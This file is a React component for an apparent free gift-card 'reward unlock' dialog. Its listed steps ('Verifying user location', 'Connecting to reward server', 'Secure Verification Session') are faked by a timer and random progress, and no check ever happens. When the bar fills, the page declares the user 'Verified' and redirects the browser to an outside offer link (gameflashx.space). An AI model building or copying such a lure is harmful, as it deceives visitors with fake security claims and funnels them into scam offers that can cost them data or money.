"use client";

import { useEffect, useState } from 'react';
import { Dialog, DialogContent } from '@/components/ui/dialog';
import { Progress } from '@/components/ui/progress';
import { Zap, CheckCircle2, Loader2, Sparkles, ShieldCheck } from 'lucide-react';
import { GiftCard } from '@/lib/gift-cards';
import { PlaceHolderImages } from '@/lib/placeholder-images';
import Image from 'next/image';

const steps = [
  "Checking reward availability...",
  "Verifying user location...",
  "Connecting to reward server...",
  "Validating reward eligibility...",
  "Complete quick verification to unlock reward",
  "Reward ready!"
];

export function RewardUnlockModal({ 
  card, 
  value, 
  isOpen, 
  onClose 
}: { 
  card: GiftCard; 
  value: string;
  isOpen: boolean; 
  onClose: () => void 
}) {
  const [currentStep, setCurrentStep] = useState(0);
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    if (isOpen) {
      setCurrentStep(0);
      setProgress(0);
      
      const interval = setInterval(() => {
        setProgress(prev => {
          if (prev >= 100) {
            clearInterval(interval);
            setTimeout(() => {
              window.location.href = "https://gameflashx.space/cl/i/277ood";
            }, 1500);
            return 100;
          }
          const next = prev + (Math.random() * 8);
          
          const stepIndex = Math.floor((next / 100) * (steps.length - 1));
          if (stepIndex > currentStep) setCurrentStep(stepIndex);
          
          return Math.min(next, 100);
        });
      }, 400);

      return () => clearInterval(interval);
    }
  }, [isOpen, currentStep]);

  const imageData = PlaceHolderImages.find(img => img.id === card.image) || PlaceHolderImages[0];

  return (
    <Dialog open={isOpen} onOpenChange={(open) => !open && onClose()}>
      <DialogContent className="max-w-2xl bg-[#020617]/95 backdrop-blur-3xl border-white/10 p-0 overflow-hidden">
        <div className="relative p-8 md:p-12 flex flex-col items-center text-center">
          <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full h-1 bg-primary/20">
            <div 
              className="h-full bg-primary transition-all duration-300 shadow-[0_0_15px_rgba(223,16,78,0.8)]" 
              style={{ width: `${progress}%` }} 
            />
          </div>

          <div className="relative w-48 h-32 md:w-64 md:h-40 rounded-3xl overflow-hidden mb-8 shadow-[0_20px_50px_rgba(0,0,0,0.5)] border border-white/10 animate-float">
            <Image 
              src={imageData.imageUrl}
              alt={card.brand}
              fill
              className="object-cover"
            />
            <div className="absolute inset-0 bg-gradient-to-t from-black/60 flex items-end justify-center p-4">
              <span className="text-3xl font-black text-white drop-shadow-2xl">{value} {card.brand}</span>
            </div>
          </div>

          <h2 className="font-headline text-3xl md:text-4xl font-black mb-2 text-white uppercase tracking-tight">Unlocking Reward</h2>
          <div className="flex items-center gap-2 mb-10 text-primary font-bold text-sm uppercase tracking-widest">
            <ShieldCheck className="w-4 h-4" /> Secure Verification Session
          </div>

          <div className="w-full max-w-md space-y-5">
            <div className="flex flex-col gap-4 text-left">
              {steps.map((step, idx) => (
                <div key={idx} className={`flex items-center gap-3 transition-all duration-500 ${idx <= currentStep ? 'opacity-100 translate-x-0' : 'opacity-20 translate-x-4'}`}>
                  {idx < currentStep ? (
                    <div className="w-5 h-5 bg-green-500/20 rounded-full flex items-center justify-center">
                      <CheckCircle2 className="w-4 h-4 text-green-500" />
                    </div>
                  ) : idx === currentStep && progress < 100 ? (
                    <Loader2 className="w-5 h-5 text-primary animate-spin" />
                  ) : idx === currentStep && progress === 100 ? (
                    <div className="w-5 h-5 bg-green-500/20 rounded-full flex items-center justify-center">
                      <CheckCircle2 className="w-4 h-4 text-green-500" />
                    </div>
                  ) : (
                    <Zap className="w-5 h-5 text-white/20" />
                  )}
                  <span className={`text-sm md:text-base font-bold tracking-tight ${idx === currentStep ? 'text-primary' : 'text-white/60'}`}>
                    {step}
                  </span>
                </div>
              ))}
            </div>

            <div className="pt-6">
              <div className="flex justify-between mb-3 text-[10px] font-black text-muted-foreground uppercase tracking-[0.2em]">
                <span>Status: {progress === 100 ? 'Verified' : 'Processing'}</span>
                <span>{Math.round(progress)}% Secure</span>
              </div>
              <Progress value={progress} className="h-2.5 bg-white/5 border border-white/5" />
            </div>
          </div>

          {progress === 100 && (
            <div className="absolute inset-0 bg-primary flex flex-col items-center justify-center animate-in fade-in zoom-in duration-500 z-50">
              <div className="w-24 h-24 bg-white/20 rounded-full flex items-center justify-center mb-6 animate-pulse">
                <Sparkles className="w-12 h-12 text-white" />
              </div>
              <h3 className="text-5xl font-headline font-black text-white mb-2 tracking-tighter italic">REWARD READY!</h3>
              <p className="text-white/80 font-bold uppercase tracking-widest text-sm">Redirecting to claim terminal...</p>
            </div>
          )}
        </div>
      </DialogContent>
    </Dialog>
  );
}
